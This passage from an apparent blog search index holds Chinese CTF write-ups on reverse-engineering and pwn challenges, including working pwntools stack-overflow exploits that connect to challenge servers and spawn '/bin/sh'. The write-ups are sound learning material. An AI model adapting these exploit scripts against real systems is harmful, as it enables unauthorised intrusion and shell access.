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 原来这是图片数据，base64 png让我想到了经常看见但是没用过的base64转图片，转出来一个二维码，扫描后得到flag。 Timer用dex2jar和jd-gui操作一下得到 12345if (MainActivity.this.beg - MainActivity.this.now &lt;= 0) &#123; paramBundle.setText(&quot;The flag is:&quot;); localTextView.setText(&quot;alictf&#123;&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;&#125;&quot;); &#125; 可以看到flag的格式啥的了，可是不会java有点看不懂，后面也有几题都是apk，等看了java再来看看。 love直接ida打开，搜索flag找到了关键函数。 要求输入flag，经过一个函数加密后，再每一位加上下标值，与一固定字符串对比。写脚本得出加上下标值之前的字符串： 123456#!/usr/bin/env pythonkey=&apos;e3nifIH9b_C@n@dH&apos;temp=&apos;&apos;for i in range(len(key)): temp+=chr(ord(key[i])-i)print temp 后发现加密函数就是base64加密，直接解密刚刚得到的temp字符串得到flag。","categories":[],"tags":[]},{"title":"CGCTF-stackoverflow","slug":"cgctf-stackoverflow","date":"2018-10-03T11:34:16.000Z","updated":"2019-03-05T15:36:34.483Z","comments":true,"path":"2018/10/03/cgctf-stackoverflow/","link":"","permalink":"http://yoursite.com/2018/10/03/cgctf-stackoverflow/","excerpt":"","text":"题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&quot;you can leave some message here:&quot;);fgets(A, 60, stdin);puts(&quot;your name please:&quot;);fgets(&amp;s, n, stdin);return puts(&quot;Thank you&quot;); a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。 脚本如下： 1234567891011from pwn import *sh=remote(&apos;182.254.217.142&apos;,10001)sh.recvuntil(&apos;your choice:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;you can leave some message here:&apos;)payload=&apos;/bin/sh\\0&apos;+&apos;a&apos;*40sh.sendline(payload)sh.recvuntil(&apos;your name please:&apos;)payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)sh.sendline(payload)sh.interactive() 随后按照题目提示进入目录cat flag即可","categories":[],"tags":[]},{"title":"十一欢乐赛-pwn4","slug":"十一欢乐赛-pwn4","date":"2018-10-03T09:19:05.000Z","updated":"2018-10-03T09:54:31.371Z","comments":true,"path":"2018/10/03/十一欢乐赛-pwn4/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/","excerpt":"","text":"有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。 脚本如下： 12345678910111213141516from pwn import *sh=remote(&quot;47.100.40.190&quot;,10009)sh.recvuntil(&apos;username: &apos;)sh.sendline(&apos;admin&apos;)sh.recvuntil(&apos;password: &apos;)sh.sendline(&apos;T6OBSh2i&apos;)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Command: &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Your choice: &apos;)payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)sh.sendline(payload)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;3&apos;)sh.interactive() 随后cat flag即可得到flag","categories":[],"tags":[]},{"title":"十一欢乐赛-bss_stack","slug":"十一欢乐赛-bss-stack","date":"2018-10-03T08:24:15.000Z","updated":"2018-10-03T09:27:54.207Z","comments":true,"path":"2018/10/03/十一欢乐赛-bss-stack/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/","excerpt":"","text":"找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&quot;Enter password: &quot;);fflush(stdout);fgets(&amp;s, 100, stdin);puts(&quot;Authentification failed&quot;);fflush(stdout);return sleep(1u); fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。 这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下： 12345678910from pwn import *sh=remote(&quot;47.100.40.190&quot;,10011)sh.recvuntil(&apos;User name : &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Action: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Enter password: &apos;)payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)sh.sendline(payload)sh.interactive() 之后cat flag就可以得到flag了","categories":[],"tags":[]},{"title":"CGCTF-born","slug":"cgctf-born","date":"2018-10-02T08:37:30.000Z","updated":"2019-03-05T15:36:24.851Z","comments":true,"path":"2018/10/02/cgctf-born/","link":"","permalink":"http://yoursite.com/2018/10/02/cgctf-born/","excerpt":"","text":"题目地址 看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333 打开test.c: 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;struct Student &#123; char name[8]; int birth;&#125;;int main(void) &#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); struct Student student; printf(&quot;What\\&apos;s Your Birth?\\n&quot;); scanf(&quot;%d&quot;, &amp;student.birth); while (getchar() != &apos;\\n&apos;) ; if (student.birth == 1926) &#123; printf(&quot;You Cannot Born In 1926!\\n&quot;); return 0; &#125; printf(&quot;What\\&apos;s Your Name?\\n&quot;); gets(student.name); printf(&quot;You Are Born In %d\\n&quot;, student.birth); if (student.birth == 1926) &#123; printf(&quot;You Shall Have Flag.\\n&quot;); system(&quot;cat flag&quot;); &#125; else &#123; printf(&quot;You Are Naive.\\n&quot;); printf(&quot;You Speed One Second Here.\\n&quot;); &#125; return 0;&#125; 发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下： 12345from pwn import *sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)sh.sendline(&apos;0&apos;)sh.sendline(&apos;0&apos;*8 + p32(1926))sh.interactive flag get","categories":[],"tags":[]},{"title":"十一欢乐赛-reverse","slug":"十一欢乐赛-reverse","date":"2018-10-02T05:03:23.000Z","updated":"2018-10-03T08:24:38.780Z","comments":true,"path":"2018/10/02/十一欢乐赛-reverse/","link":"","permalink":"http://yoursite.com/2018/10/02/十一欢乐赛-reverse/","excerpt":"","text":"HelloReverse直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。 HelloPythonpyc文件反编译一波直接运行，得不到flag分析一波程序。 123if len(sys.argv) &lt; 5: print(&quot;I can&apos;t give you flag :(&quot;) sys.exit(0) 找到了一个判断条件，直接把exit(0)去掉 再把输入flag的判断条件改为1： 12if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]): print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;)) 运行发现n = None // 2会报错改成n=1试试发现输出了一个S应该就是flag的开头 最后尝试出n=33时输出完整flag XOR1ida打开发现直接把两个数组异或就能得到flag XOR2和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。 Maze写过了maze就很容易了，wasd对应上下左右移动地图如下： 123456789OOOO*OOOOO1111O11OO1OOOO1OOO11O111OOOO111OO1OOOO1OO11OOOO111O1OOOO1O1111OOOOOOOO1 沿着1走到*得到flag 加上SUSCTF{} 题目都很简单，其他方向的也都是当场百度就能做(pwn还没","categories":[],"tags":[]},{"title":"CGCTF-homuraVM","slug":"cgctf-homuraVM","date":"2018-09-29T10:23:34.000Z","updated":"2019-03-05T15:36:08.573Z","comments":true,"path":"2018/09/29/cgctf-homuraVM/","link":"","permalink":"http://yoursite.com/2018/09/29/cgctf-homuraVM/","excerpt":"","text":"题目地址 ida打开F5主函数代码,要求输入一个字符串s 然后input[i+1]=s[i]input[0]=s[len(s)-1] 之后把两个很长的字符串分别赋值到v39,v40 sub_8DC函数根据这两个字符串对input进行操作 sub_8AA不知道是干啥的，后百度得知是反调试 最后将处理过的input与给定的值对比，相同则ok value1和value2初始值为0 i为很长的字符串的下标 读取到每个字符对应到的操作如下： 12345678910111213141516171819case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++icase &quot;G&quot;:--*value2 ++icase &quot;M&quot;:*value2=*value1+*input ++icase &quot;T&quot;:++*value2 ++icase &quot;[&quot;:if *input!=0 ++i else i为]后一位case &quot;]&quot;:if *input!=0 i为[后一位 else ++icase &quot;a&quot;:--*value1 ++icase &quot;h&quot;:input=input+4 ++icase &quot;m&quot;:++*input ++icase &quot;o&quot;:input=input-4 ++icase &quot;r&quot;:++*value1 ++icase &quot;u&quot;:--*input ++icase &quot;v&quot;:*value2=*value1 ++icase &quot;&#123;&quot;:if *value2!=0 ++i else i为&#125;后一位case &quot;&#125;&quot;:if *value2!=0 i为&#123;后一位 else ++i 注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下 12345678910111213141516171819202122232425262728293031323334h[ur]ovMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125; 其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG} 1234567891011121314151617181920[ur]： *value1=*input *input减到0 &#123;aG&#125;： *value1-=*value2 *value2减到0 &#123;mG&#125;： *input+=*value2 *value2减到0 hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:input+=4*value2=*value1*value1-=*value2*value2=0*value1=*input*input=0input-=4*value2=*value1.. 此部分仅ar数量及顺序不同，控制*value1.*value2=*value1+*input*value2-=2*(*value1&amp;*ipnut)input+=4*input+=*value2*value2=0 作用为：input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i]) 不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1] 12345678import stringfinal=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]ar=&apos;&apos;for i in range(33): for s in string.printable: if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]: ar+=sprint ar 得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\\aqc/M} 接下来根据ar的个数进行逆运算即可: 123456operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\\\aqc/M&#125;&apos;)for i in range(len(operate)): final[i]=chr(operate[i]+ord(final[i]))flag=&apos;&apos;.join(final)print flag 得到flag第二位开始为lag{D3v1L_H0mur4_f**k_y0uR_bra1N} 很明显第一位为f 手动添加上 flag get","categories":[],"tags":[]},{"title":"sus-ccc","slug":"sus-ccc","date":"2018-09-26T14:52:35.000Z","updated":"2018-10-11T12:51:43.294Z","comments":true,"path":"2018/09/26/sus-ccc/","link":"","permalink":"http://yoursite.com/2018/09/26/sus-ccc/","excerpt":"","text":"题目地址 主函数很简单，直接看验证函数： 1234567891011v6 = 0;if ( a2 != 42 ) return 0;for ( i = 3; i &lt;= 42; i += 3 )&#123; v3 = crc32(0, (_BYTE *)a1, i); v4 = v6++; if ( v3 != hashes[v4] ) return 0;&#125;return 1; 输入一共42位，1-3，1-6，1-9一直到1-42循环经过crc32函数处理后与hashes值进行比对，一共比对14次。crc32函数如下： 123456789v6 = a2; for ( i = ~a1; ; i = (i &gt;&gt; 8) ^ crc32_tab[(unsigned __int8)(i ^ *v3)] ) &#123; v4 = a3--; if ( !v4 ) break; v3 = v6++; &#125; return ~i; 然而不管是写爆破脚本还是逆运算脚本都没能得到flag……觉得自己对函数的理解没有错误，百度了一下python中~0=-1,c语言中~0=1，所以出了问题。看了大佬的writeup发现python里可以使用crc32函数，于是爆破脚本如下： 1234567891011121314#!/usr/bin/env pythonimport stringimport binasciihashes=[0xD641596F,0x80A3E990,0xC98D5C9B,0xD05AFAF,0x1372A12D,0x5D5F117B,0x4001FBFD,0xA7D2D56B,0x7D04FB7E,0x2E42895E,0x61C97EB3,0x84AB43C3,0x9FC129DD,0xF4592F4D]flag=&apos;&apos;for n in hashes: for i in string.printable: for j in string.printable: for k in string.printable: temp=i+j+k if binascii.crc32(flag+temp)&amp;0xffffffff == n: flag+=temp break;print flag flag get","categories":[],"tags":[]},{"title":"sus-accumulator","slug":"sus-accumulator","date":"2018-09-24T07:15:10.000Z","updated":"2018-09-24T07:32:29.961Z","comments":true,"path":"2018/09/24/sus-accumulator/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-accumulator/","excerpt":"","text":"题目地址 拖进ida 主函数： 12345678910111213141516171819202122232425262728293031323334__int64 v3; // rbx char v4; // al signed __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-458h] char v7; // [rsp+3Fh] [rbp-419h] char input; // [rsp+40h] [rbp-418h] unsigned __int64 v9; // [rsp+448h] [rbp-10h] v3 = 0LL; v9 = __readfsqword(0x28u); __printf_chk(1LL, &quot;What&apos;s your flag? &quot;, a3); do &#123; v4 = _IO_getc(stdin); if ( v4 == &apos;\\n&apos; ) break; if ( v4 == -1 ) break; *(&amp;v7 + ++v3) = v4; &#125; while ( v3 != 1024 ); if ( SHA512((__int64)&amp;input, v3, (__int64)&amp;v6) )// v6=sha512(input) &#123; sub_4008C0((unsigned __int8 *)&amp;v6, 64LL); sub_4008C0((unsigned __int8 *)&amp;input, v3); puts(&quot;Good flag for you.&quot;); result = 0LL; &#125; else &#123; puts(&quot;error&quot;); result = 1LL; &#125; return result; do~while循环里是读取输入，最多读取1024位，遇到回车符或读取完则停止，很明显if条件必成立，v6=sha512(input)，进入sub4008c0函数 123456789101112131415161718192021222324252627if ( a2 ) &#123; v2 = i + *a1; // i,j初始为0 v3 = v2 == dword_601080[j]; v4 = (unsigned int)(j + 1); i += *a1; ++j; if ( !v3 ) &#123;LABEL_8: puts(&quot;Bad flag :(&quot;); exit(1); &#125; v5 = a1 + 1; v6 = &amp;a1[a2]; while ( v5 != v6 ) &#123; v7 = *v5++; v2 += v7; v3 = v2 == dword_601080[v4]; i = v2; j = v4 + 1; if ( !v3 ) goto LABEL_8; v4 = (unsigned int)(v4 + 1); &#125; &#125; 一开始没分析出i和j的作用…对应的地址内存值为????一脸懵逼以为是没看见赋值，后知道了i和j是下标的作用，很容易分析出dword601080处的值就是input累加的结果，也就是说flag和dword601080内存值的位数是相等的，直接根据第二次sub4008c0就可以逆运算出flag，不需要管if条件对v6的操作以及第一次此函数对v6值的校验。然而照这样手动逆运算了前几个值，并没有得到类似于flag开头之类的字符，以为是分析错了，又看了好几遍函数，结果只是flag并不是从头开始……前几位是无意义的字符而已， 首次使用了idc脚本dump下了dword601080处内存，逆运算脚本如下： 123456a=[195,255,493,584,799,929,946,1086,1180,1184,1421,1595,1805,1846,2081,2320,2430,2605,2727,2972,3213,3403,3418,3649,3712,3950,3989,4193,4228,4394,4523,4624,4706,4935,4999,5072,5106,5291,5510,5536,5644,5751,5993,6118,6126,6198,6211,6410,6469,6609,6647,6752,6978,7010,7053,7106,7274,7468,7563,7673,7706,7956,8146,8187,8257,8333,8398,8469,8592,8640,8693,8742,8793,8844,8901,8953,9007,9062,9113,9161,9215,9317,9374,9429,9483,9540,9591,9644,9692,9741,9792,9846,9944,9996,10045,10144,10195,10246,10294,10350,10402,10450,10551,10652,10750,10849,10946,11045,11096,11147,11202,11304,11353,11451,11507,11605,11653,11753,11852,11900,11951,12052,12105,12161,12259,12360,12409,12461,12563,12664,12718,12775,12823,12921,12970,13020,13071,13173,13227,13276,13374,13422,13521,13569,13667,13718,13771,13873,13972,14029,14080,14179,14278,14377,14432,14482,14531,14579,14627,14679,14732,14789,14840,14894,14951,15052,15154,15210,15263,15314,15363,15460,15509,15610,15666,15763,15818,15916,15968,16018,16075,16132,16233,16288,16386,16443,16543,16600,16655,16703,16801,16858,16955,17005,17056,17153,17250,17375]b=[195]for i in range(1,len(a)): b.append(a[i]-a[i-1])s=&apos;&apos;.join([chr(i)for i in b])print s 忽略掉前几个无意义字符后出现flag{} 12sH1rkEr:desktop macbook$ python 1.py?;?&amp;i? +5??_n!??)FLAG&#123;051339467306f9769350136b41c330840eebcac337f1b8b0dc03e58be14fe690b123f61b0c0b35fc93ccc72100459369ef8531a1e8a7b4299e7b9d970b9a23aa&#125; flag get","categories":[],"tags":[]},{"title":"sus-pyyy","slug":"sus-pyyy","date":"2018-09-24T04:22:05.000Z","updated":"2018-09-24T04:28:57.306Z","comments":true,"path":"2018/09/24/sus-pyyy/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-pyyy/","excerpt":"","text":"题目地址 下载下来是个pyc文件，直接反编译一波： 12345678910111213141516171819202122232425#!/usr/bin/env python__import__(&apos;sys&apos;).setrecursionlimit(1048576)data = &apos;Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI&apos;a = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907Lb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499Lc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619Ld = 